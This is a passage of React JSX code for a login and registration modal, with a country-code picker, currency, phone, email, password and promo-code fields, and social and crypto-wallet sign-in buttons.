                    : loginPhoneCountry.code === country.code && loginPhoneCountry.name === country.name;
                return (
                  <button
                    key={`${country.code}-${idx}`}
                    type="button"
                    className={`win-country-item${isSelected ? ' win-picker-item--active' : ''}`}
                    onClick={() => {
                      if (authMode === 'register') {
                        setRegCountry(country);
                      } else {
                        setLoginPhoneCountry(country);
                      }
                      setSubView('form');
                    }}
                  >
                    <span className="win-country-flag">{country.flag}</span>
                    <span className="win-country-dialcode">{country.code}</span>
                    <span className="win-country-name">{country.name}</span>
                  </button>
                );
              })}
              {filteredCountries.length === 0 && (
                <div className="win-picker-empty">No countries found</div>
              )}
            </div>
          </div>
        ) : authMode === 'register' ? (
          /* ===================================================================
              VIEW: REGISTRATION FORM (Image 1 Exact)
              =================================================================== */
          <div className="win-auth-card-body">
            {/* Header: Title + Close Button */}
            <div className="win-auth-header">
              <h2 className="win-auth-title">Registration</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Close registration"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <form noValidate onSubmit={handleRegisterSubmit} className="win-form">
              {/* Field 1: Currency Selector Button */}
              <div className="win-field-group">
                <button
                  type="button"
                  className="win-field-pill win-currency-selector-pill"
                  onClick={() => {
                    setCurrencySearch('');
                    setSubView('currency');
                  }}
                  aria-label="Choose currency"
                >
                  <div className="win-field-prefix-wrap">
                    <CurrencyBadge currency={regCurrency} size={24} />
                  </div>
                  <div className="win-field-vdivider" />
                  <span className="win-currency-selected-name">{regCurrency.name}</span>
                  <ChevronDownIcon className="win-field-chevron" />
                </button>
              </div>

              {/* Field 2: Phone Input with Flag & Dial Code */}
              <div className="win-field-group">
                <div className={`win-field-pill${regPhoneErr ? ' win-field-pill--error' : ''}`}>
                  <button
                    type="button"
                    className="win-country-prefix-btn"
                    onClick={() => {
                      setCountrySearch('');
                      setSubView('country');
                    }}
                    aria-label="Select country code"
                  >
                    <span className="win-country-prefix-flag">{regCountry.flag}</span>
                    <ChevronDownIcon className="win-prefix-chevron" />
                  </button>
                  <div className="win-field-vdivider" />
                  <span className="win-dialcode-badge">{regCountry.code}</span>
                  <input
                    type="tel"
                    className="win-field-input"
                    placeholder="00000 00000"
                    autoComplete="tel"
                    value={regPhone}
                    onChange={(e) => handlePhoneChange(e.target.value, setRegPhone)}
                    onFocus={() => setRegPhoneErr('')}
                  />
                </div>
                {regPhoneErr && <span className="win-field-error-text">{regPhoneErr}</span>}
              </div>

              {/* Field 3: Email Input */}
              <div className="win-field-group">
                <div className={`win-field-pill${regEmailErr ? ' win-field-pill--error' : ''}`}>
                  <div className="win-field-prefix-wrap">
                    <EnvelopeIcon />
                  </div>
                  <div className="win-field-vdivider" />
                  <input
                    type="email"
                    className="win-field-input"
                    placeholder="Email"
                    autoComplete="email"
                    value={regEmail}
                    onChange={(e) => setRegEmail(e.target.value)}
                    onFocus={() => setRegEmailErr('')}
                  />
                </div>
                {regEmailErr && <span className="win-field-error-text">{regEmailErr}</span>}
              </div>

              {/* Field 4: Password Input (No right icon, exact match) */}
              <div className="win-field-group">
                <div className={`win-field-pill${regPwdErr ? ' win-field-pill--error' : ''}`}>
                  <div className="win-field-prefix-wrap">
                    <LockIcon />
                  </div>
                  <div className="win-field-vdivider" />
                  <input
                    type="password"
                    className="win-field-input"
                    placeholder="Password"
                    autoComplete="new-password"
                    value={regPwd}
                    onChange={(e) => setRegPwd(e.target.value)}
                    onFocus={() => setRegPwdErr('')}
                  />
                </div>
                <div className="win-field-helper-text">At least 8 characters</div>
                {regPwdErr && <span className="win-field-error-text">{regPwdErr}</span>}
              </div>

              {/* Promo Code Link & Expanded Input */}
              <div className="win-promo-section">
                <button
                  type="button"
                  className="win-promo-link-btn"
                  onClick={() => setShowPromo(!showPromo)}
                >
                  {showPromo ? '− Hide promo code' : 'Add promo code'}
                </button>
                {showPromo && (
                  <div className="win-promo-input-wrap">
                    <input
                      type="text"
                      className="win-promo-input"
                      placeholder="Enter promo code (e.g. VIP2026)"
                      value={regPromo}
                      onChange={(e) => setRegPromo(e.target.value)}
                    />
                  </div>
                )}
              </div>

              {/* Terms Checkbox */}
              <div className="win-terms-group">
                <label className="win-terms-label">
                  <input
                    type="checkbox"
                    className="win-terms-checkbox"
                    checked={regAgreed}
                    onChange={(e) => {
                      setRegAgreed(e.target.checked);
                      if (e.target.checked) setRegAgreedErr('');
                    }}
                  />
                  <span className="win-terms-text">
                    By clicking Register, I accept{' '}
                    <a href="#" className="win-link-blue" onClick={(e) => e.preventDefault()}>
                      the User Agreement
                    </a>
                  </span>
                </label>
                {regAgreedErr && <span className="win-field-error-text">{regAgreedErr}</span>}
              </div>

              {/* Register Button: Soft Mint Green */}
              <button
                type="submit"
                className="win-btn-submit win-btn-register"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Registering...' : 'Register'}
              </button>
            </form>

            {/* Divider 'or' */}
            <div className="win-divider">
              <span>or</span>
            </div>

            {/* Social Registration Row */}
            <div className="win-social-row">
              <button type="button" className="win-social-btn" aria-label="Register with Google">
                <GoogleIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with Telegram">
                <TelegramIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with WebMoney">
                <WebMoneyIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with MetaMask">
                <MetaMaskFoxIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with Trust Wallet">
                <ShieldIcon />
              </button>
            </div>

            {/* Footer Switch to Login */}
            <div className="win-footer-switch">
              <span>Already have an account? </span>
              <button
                type="button"
                className="win-link-blue win-link-bold"
                onClick={() => {
                  setAuthMode('login');
                  clearAllErrors();
                }}
              >
                Log in
              </button>
            </div>
          </div>
        ) : (
          /* ===================================================================
              VIEW: LOGIN FORM
              =================================================================== */
          <div className="win-auth-card-body">
            {/* Header: Title + Close Button */}
            <div className="win-auth-header">
              <h2 className="win-auth-title">Login</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Close login"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            {/* Sub-tabs: Phone vs Email */}
            <div className="win-login-subtabs">
              <button
                type="button"
                className={`win-login-subtab${loginSubTab === 'phone' ? ' win-login-subtab--active' : ''}`}
                onClick={() => {
                  setLoginSubTab('phone');
                  clearAllErrors();
                }}
              >
                <PhoneTabIcon />
                <span>Phone</span>
              </button>
              <button
                type="button"
                className={`win-login-subtab${loginSubTab === 'email' ? ' win-login-subtab--active' : ''}`}
                onClick={() => {
                  setLoginSubTab('email');
                  clearAllErrors();
                }}
              >
                <EmailTabIcon />
                <span>Email</span>
              </button>
            </div>

            <form noValidate onSubmit={handleLoginSubmit} className="win-form">
              {loginSubTab === 'phone' ? (
                <div className="win-field-group">
                  <div className={`win-field-pill${loginPhoneErr ? ' win-field-pill--error' : ''}`}>
                    <button
                      type="button"
                      className="win-country-prefix-btn"
                      onClick={() => {
                        setCountrySearch('');
                        setSubView('country');
                      }}
                      aria-label="Select country code"
                    >
                      <span className="win-country-prefix-flag">{loginPhoneCountry.flag}</span>
                      <ChevronDownIcon className="win-prefix-chevron" />
                    </button>
                    <div className="win-field-vdivider" />
                    <span className="win-dialcode-badge">{loginPhoneCountry.code}</span>
                    <input
                      type="tel"
                      className="win-field-input"
                      placeholder="00000 00000"
                      autoComplete="tel"
                      value={loginPhone}
                      onChange={(e) => handlePhoneChange(e.target.value, setLoginPhone)}
                      onFocus={() => setLoginPhoneErr('')}
                    />
                  </div>
                  {loginPhoneErr && <span className="win-field-error-text">{loginPhoneErr}</span>}
                </div>
              ) : (
                <div className="win-field-group">
                  <div className={`win-field-pill${loginEmailErr ? ' win-field-pill--error' : ''}`}>
                    <div className="win-field-prefix-wrap">
                      <EnvelopeIcon />
                    </div>
                    <input
                      type="email"
                      className="win-field-input"
                      placeholder="Email"
                      autoComplete="email"
                      value={loginEmail}
                      onChange={(e) => setLoginEmail(e.target.value)}
                      onFocus={() => setLoginEmailErr('')}
                    />
                  </div>
                  {loginEmailErr && <span className="win-field-error-text">{loginEmailErr}</span>}
                </div>
              )}

              {/* Password */}
              <div className="win-field-group">
                <div className={`win-field-pill${loginPwdErr ? ' win-field-pill--error' : ''}`}>
                  <div className="win-field-prefix-wrap">
                    <LockIcon />
                  </div>
                  <input
                    type="password"
                    className="win-field-input"
                    placeholder="Password"
                    autoComplete="current-password"
                    value={loginPwd}
                    onChange={(e) => setLoginPwd(e.target.value)}
                    onFocus={() => setLoginPwdErr('')}
                  />
                </div>
                {loginPwdErr && <span className="win-field-error-text">{loginPwdErr}</span>}
              </div>

              {/* Forgot Password */}
              <div className="win-forgot-pwd-wrap">
                <button type="button" className="win-link-blue" onClick={(e) => e.preventDefault()}>
                  Forgot your password?
                </button>
              </div>

              {/* Log in Button */}
              <button
                type="submit"
                className="win-btn-submit win-btn-login"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            {/* Divider 'or' */}
            <div className="win-divider">
              <span>or</span>
            </div>

            {/* Social Login Grid (Row 1: 6 icons, Row 2: 1 centered Shield icon) */}
            <div className="win-social-grid">
              <div className="win-social-row">
                <button type="button" className="win-social-btn" aria-label="Log in with Google">
                  <GoogleIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with VK">
                  <VkIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with Telegram">
                  <TelegramIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with Yandex">
                  <YandexIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with WalletConnect">
                  <WalletConnectIcon />
                </button>
                <button type="button" className="win-social-btn" aria-label="Log in with MetaMask">
                  <MetaMaskFoxIcon />
                </button>
              </div>
              <div className="win-social-row-center">
                <button type="button" className="win-social-btn" aria-label="Log in with Shield">
                  <ShieldIcon />
                </button>
              </div>
            </div>

            {/* Footer Switch to Register */}
            <div className="win-footer-switch">
              <div className="win-footer-switch-prompt">Don’t have an account?</div>
              <button
                type="button"
                className="win-link-blue win-link-bold win-footer-register-link"
                onClick={() => {
                  setAuthMode('register');
                  clearAllErrors();
                }}
              >
                Register
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
